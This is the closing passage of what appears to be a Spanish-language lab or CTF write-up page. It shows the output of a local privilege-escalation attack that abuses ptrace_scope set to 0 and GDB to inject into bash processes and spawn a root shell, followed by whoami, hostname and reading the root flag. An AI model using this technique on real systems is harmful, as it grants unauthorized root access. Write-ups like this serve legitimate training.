+[*] Checking if 'ptrace_scope' is set to 0... [√]
+[*] Checking if 'GDB' is installed...         [√]
+[*] System seems vulnerable!                  [√]
+
+[*] Starting attack...
+[*] PID -> bash
+[*] Path 31766: /root
+[*] PID -> bash
+[*] Path 31834: /home/s4vitar
+
+[*] Cleaning up...                            [√]
+[*] Spawning root shell...                    [√]
+
+</span><span class="kd">bash-5.1#</span><span class="p"> whoami
+root
+</span><span class="kd">bash-5.1#</span><span class="p"> hostname -I
+192.168.100.71 
+</span><span class="kd">bash-5.1#</span><span class="p"> cat /root/root.txt
+f5da7a83a519369acee489b9c727aab3
+</span><span class="kd">bash-5.1#</span>
+</code></pre></div></div>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+    </div>
+  </body>
+</html>
